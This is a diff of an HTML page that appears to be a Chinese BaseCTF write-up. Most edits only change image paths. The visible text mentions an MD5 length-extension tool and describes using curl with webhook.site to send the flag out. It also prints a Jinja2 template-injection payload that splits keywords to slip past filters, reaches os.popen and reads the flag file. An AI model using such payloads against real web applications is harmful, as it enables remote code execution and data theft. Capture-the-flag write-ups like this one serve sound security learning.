@@ -641,7 +641,7 @@
 <p>这里使用<a class="link" href="https://github.com/luoingly/attack-scripts/blob/main/logic/md5-extension-attack.py"  target="_blank" rel="noopener"
     >工具</a>生成了，我是菜比</p>
 <p>先输入random的文本长度，然后是random的hash，最后是我们希望拓展的字符串</p>
-<p><img src="/static/img/image-20240912194812065.png"
+<p><img src="/img/image-20240912194812065.png"
 	
 	
 	
@@ -689,10 +689,9 @@
 	
 ></p>
 <ol start="2">
-<li></li>
+<li>利用curl命令和[webhook](<a class="link" href="https://webhook.site/"  target="_blank" rel="noopener"
+    >Webhook.site - Test, transform and automate Web requests and emails</a>)进行信息外带出flag</li>
 </ol>
-<p>利用curl命令和[webhook](<a class="link" href="https://webhook.site/"  target="_blank" rel="noopener"
-    >Webhook.site - Test, transform and automate Web requests and emails</a>)进行信息外带出flag</p>
 <p>payload</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -857,7 +856,7 @@
 	
 ></p>
 <p>寻找一个含os模块能RCE的类，我这里懒得写脚本直接用Notepad++将逗号替换为换行符找到该模块的位置为137</p>
-<p><img src="/static/img/image-20240912204530622.png"
+<p><img src="/img/image-20240912204530622.png"
 	
 	
 	
@@ -929,7 +928,7 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>后面查看该系统环境变量存在一个为根号的环境变量</p>
-<p><img src="/static/img/image-20240912205859146.png"
+<p><img src="/img/image-20240912205859146.png"
 	
 	
 	
@@ -948,7 +947,7 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">BaseCTF{%print(&#39;&#39;[&#39;_&#39;&#39;_cl&#39;&#39;ass_&#39;&#39;_&#39;][&#39;_&#39;&#39;_ba&#39;&#39;se_&#39;&#39;_&#39;][&#39;_&#39;&#39;_subcla&#39;&#39;sses_&#39;&#39;_&#39;]()[137][&#39;_&#39;&#39;_in&#39;&#39;it_&#39;&#39;_&#39;][&#39;_&#39;&#39;_glo&#39;&#39;bals_&#39;&#39;_&#39;][&#39;po&#39;&#39;pen&#39;](&#39;cd $OLDPWD;cat flag&#39;)[&#39;rea&#39;&#39;d&#39;]())%}
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/static/img/image-20240912210153249.png"
+</div><p><img src="/img/image-20240912210153249.png"
 	
 	
 	
